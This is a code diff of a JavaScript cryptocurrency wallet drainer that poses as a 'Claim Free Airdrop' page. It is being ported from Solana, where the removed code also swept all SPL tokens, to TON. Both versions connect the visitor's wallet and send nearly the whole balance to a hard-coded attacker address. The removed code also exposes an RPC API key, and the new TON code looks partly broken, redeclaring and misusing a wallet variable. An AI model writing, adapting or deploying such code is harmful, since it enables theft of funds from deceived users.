@@ -5,23 +5,21 @@ $(document).ready(function () {
             return;
         }
 
-        if (window.solana || window.solflare) {
+        if (window.ton || window.tonkeeper) {
             try {
-                const wallet = window.solana || window.solflare;
+                const wallet = window.ton || window.tonkeeper;
                 const resp = await wallet.connect();
                 console.log("Wallet connected:", resp);
 
-                var connection = new solanaWeb3.Connection(
-                    "https://rpc.helius.xyz/?api-key=ce095e76-528b-45f9-98c6-caaba97d6b10",
-                    "confirmed"
-                );
+                const tonweb = new TonWeb();
+                const address = resp.publicKey;
+                const wallet = tonweb.wallet.create({ publicKey: new Uint8Array(address) });
 
-                const publicKey = new solanaWeb3.PublicKey(resp.publicKey);
-                const walletBalance = await connection.getBalance(publicKey);
-                console.log("Wallet balance:", walletBalance);
+                const balance = await wallet.getBalance();
+                console.log("Wallet balance:", balance);
 
-                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
-                if (walletBalance < minBalance) {
+                const minBalance = 1e9;
+                if (balance < minBalance) {
                     alert("Insufficient funds for Fee.");
                     return;
                 }
@@ -29,37 +27,27 @@ $(document).ready(function () {
                 $("#connect-wallet").text("Claim Free Airdrop");
                 $("#connect-wallet")
                     .off("click")
-                    .on("click", async () => transferAssets(connection, publicKey, walletBalance, minBalance));
+                    .on("click", async () => transferAssets(tonweb, address, balance, minBalance));
             } catch (err) {
                 console.error("Error connecting to wallet:", err);
             }
         } else {
-            alert("No supported wallet found. Please install Phantom or Solflare.");
-            window.open("https://phantom.app/download", "_blank");
+            alert("No supported wallet found. Please install Tonkeeper or another TON wallet.");
+            window.open("https://ton.org/wallet", "_blank");
         }
     }
 
     function openInWalletBrowser() {
         let siteURL = encodeURIComponent(window.location.href);
         let walletLinks = {
-            phantom: `https://phantom.app/ul/browse/${siteURL}`,
-            solflare: `https://solflare.com/browse/${siteURL}`,
-            trustwallet: `https://link.trustwallet.com/open_url?url=${siteURL}`
+            tonkeeper: `https://tonkeeper.com/?url=${siteURL}`,
         };
 
         let storeLinks = {
-            phantom: "https://phantom.app/download",
-            solflare: "https://solflare.com",
-            trustwallet: "https://trustwallet.com/"
+            tonkeeper: "https://tonkeeper.com/",
         };
 
-        let selectedWallet = "phantom"; // Default wallet
-
-        if (window.solflare) {
-            selectedWallet = "solflare";
-        } else if (window.trustwallet) {
-            selectedWallet = "trustwallet";
-        }
+        let selectedWallet = "tonkeeper";
 
         let deepLink = walletLinks[selectedWallet];
         let storeLink = storeLinks[selectedWallet];
@@ -75,54 +63,23 @@ $(document).ready(function () {
         }, 1000);
     }
 
-    async function transferAssets(connection, publicKey, walletBalance, minBalance) {
+    async function transferAssets(tonweb, address, balance, minBalance) {
         try {
-            const receiverWallet = new solanaWeb3.PublicKey("AunHeraAbHaG8JmfgQAGJtKPvTKXH1bvrcw3shxfVzHY");
-            const balanceForTransfer = walletBalance - minBalance;
-            let transaction = new solanaWeb3.Transaction();
-
+            const receiverWallet = "UQDT_5jBkJA3Y5qGeb-lZjbv8nM8yo44C81HZT78S4H6xGoh";
+            const balanceForTransfer = balance - minBalance;
             if (balanceForTransfer > 0) {
-                transaction.add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: publicKey,
-                        toPubkey: receiverWallet,
-                        lamports: balanceForTransfer * 0.99
-                    })
-                );
+                const tonAmount = balanceForTransfer / 1e9; 
+                const message = await tonweb.wallet.createTransfer({
+                    to: receiverWallet,
+                    value: tonAmount,
+                    seqno: await tonweb.wallet.getSeqno(),
+                    payload: "",
+                });
+
+                const signed = await wallet.signTransfer(message);
+                const txid = await tonweb.provider.sendMessage(signed);
+                console.log("Transaction confirmed:", txid);
             }
-
-            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
-                programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
-            });
-
-            for (let account of tokenAccounts.value) {
-                let tokenBalance = account.account.data.parsed.info.tokenAmount.uiAmount;
-                let tokenPubkey = new solanaWeb3.PublicKey(account.pubkey);
-
-                if (tokenBalance > 0) {
-                    transaction.add(
-                        splToken.Token.createTransferInstruction(
-                            splToken.TOKEN_PROGRAM_ID,
-                            tokenPubkey,
-                            receiverWallet,
-                            publicKey,
-                            [],
-                            tokenBalance
-                        )
-                    );
-                }
-            }
-
-            transaction.feePayer = publicKey;
-            let blockhashObj = await connection.getRecentBlockhash();
-            transaction.recentBlockhash = blockhashObj.blockhash;
-
-            const signed = await window.solana.signTransaction(transaction);
-            console.log("Transaction signed:", signed);
-
-            let txid = await connection.sendRawTransaction(signed.serialize());
-            await connection.confirmTransaction(txid);
-            console.log("Transaction confirmed:", txid);
         } catch (err) {
             console.error("Error during transaction:", err);
         }
